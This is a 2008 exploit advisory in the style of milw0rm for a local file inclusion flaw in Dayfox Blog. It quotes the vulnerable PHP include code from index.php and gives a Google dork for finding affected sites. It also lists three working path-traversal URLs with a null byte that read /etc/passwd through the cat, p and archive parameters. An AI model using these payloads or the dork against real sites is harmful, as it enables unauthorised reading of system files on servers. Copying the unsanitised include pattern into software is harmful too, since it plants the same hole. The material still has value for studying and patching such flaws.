@@ -1,0 +1,52 @@
+             ########################################################################
+             #                                                                      #
+             #     ..:::::Dayfox Blog LOCAL FILE INCLUSION Vulnerbility ::::...     #           
+             ########################################################################
+
+Virangar Security Team
+
+www.virangar.net
+
+--------
+Discoverd By :Virangar Security Team (hadihadi)
+
+special tnx to:MR.nosrati,black.shadowes,MR.hesy,Ali007,Zahra
+
+& all virangar members & all iranian hackerz
+
+greetz:to my best friend in the world hadi_aryaie2004
+& my lovely friend arash(imm02tal) from ISCN
+-----------------------------------
+Download: http://www.dayfoxdesigns.co.nr
+Dork:Powered by Dayfox Designs This is a port of WordPress  
+-------------------------------------------------------------------------------------------------
+vuln codes in index.php:
+############line 140-144##################
+if (isset($_GET["cat"])) {
+    $page = 'entries/'.strip_tags(htmlspecialchars($_GET["cat"])).'.txt';
+        if (file_exists($page)) {
+            echo "<br /><a href=\"javascript: history.go(-1)\">&#60; Back</a>";
+            @include ("$page");
+############line 173-178###################
+if (isset($_GET["p"])) {
+    $page = 'entries/'.strip_tags(htmlspecialchars($_GET["p"])).'.txt';
+    $pagecomments = 'entries/'.strip_tags(htmlspecialchars($_GET["p"])).'comments.txt';
+        if (file_exists($page)) {
+        echo '<br /><a href="javascript: history.go(-1)">&#60; Back</a>';
+          include ("$page");
+############line 209-213##################
+if (isset($_GET["archive"])) {
+    $page = 'entries/'.strip_tags(htmlspecialchars($_GET["archive"])).'.txt';
+        if (file_exists($page)) {
+        echo '<br /><a href="javascript: history.go(-1)">&#60; Back</a>';
+          include ("$page");
+----------------------------------------------------------------------------------------------------
+
+exploit:
+http://site.com/index.php?p=../../../../../../../etc/passwd%00        
+http://site.com/index.php?cat=../../../../../../../etc/passwd%00
+http://site.com/index.php?archive=../../../../../../../etc/passwd%00
+--------
+young iranian h4ck3rz
+
+# milw0rm.com [2008-08-04]
